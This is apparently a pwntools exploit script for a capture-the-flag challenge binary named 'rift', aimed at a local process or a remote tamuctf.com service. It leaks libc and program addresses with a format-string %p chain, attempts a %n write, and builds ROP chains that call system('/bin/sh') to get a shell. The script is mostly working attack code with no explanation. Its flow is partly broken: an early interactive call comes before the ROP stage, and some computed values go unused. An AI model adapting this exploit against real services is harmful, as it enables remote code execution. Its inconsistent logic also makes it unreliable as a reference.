from pwn import *

exe = ELF('./rift_patched')
libc = ELF('./libc.so.6')
context.binary = exe.path

io = process(exe.path)
if args.GDB:
    io = gdb.debug(exe.path, """
        b *main
        b *vuln+56
        continue
    """)
    io.recvline()
elif args.REMOTE:
    io = remote("tamuctf.com", 443, ssl=True, sni="rift")



# ***********************************************
# main & libc leak
# ***********************************************

io.sendline(b'%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p')
X = io.recvline().decode().strip().split('-')
print(X)
libc_start_main = int(X[0], 16) - 1673504
main = int(X[1], 16) - 11876
ret_addr = int(X[5], 16) + 232

print(f"libc_start_main: {hex(libc_start_main)}")
print(f"main: {hex(main)}")
print(f"ret_addr: {hex(ret_addr)}")

libc.address = libc_start_main - libc.symbols["__libc_start_main"]
exe.address = main - exe.symbols["main"]


# 0x7fffb1bc70f0
io.sendline(b"%123c%8$lln")
io.interactive()

# ***********************************************
# ROP
# ***********************************************
rop = ROP(exe)
offset = 8
writes = {ret_addr + 8: libc.symbols.system}
payload = fmtstr_payload(offset, writes, write_size='short')

rop.raw(b'a' * offset)
rop.raw(rop.ret)
rop.printf(exe.got["printf"])
rop.raw(rop.ret)
rop.main()
io.sendlineafter(b': ', rop.chain())

printf_libc = unpack(io.recv(6).ljust(8, b'\x00'))
libc.address = printf_libc - libc.symbols["printf"]

rop = ROP(exe)
system = libc.symbols["system"]
bin_sh = next(libc.search(b"/bin/sh"))
rop.raw(b'a' * offset)
rop.raw(rop.ret)
rop.call(system, [bin_sh])

io.sendlineafter(b': ', rop.chain())
io.interactive()
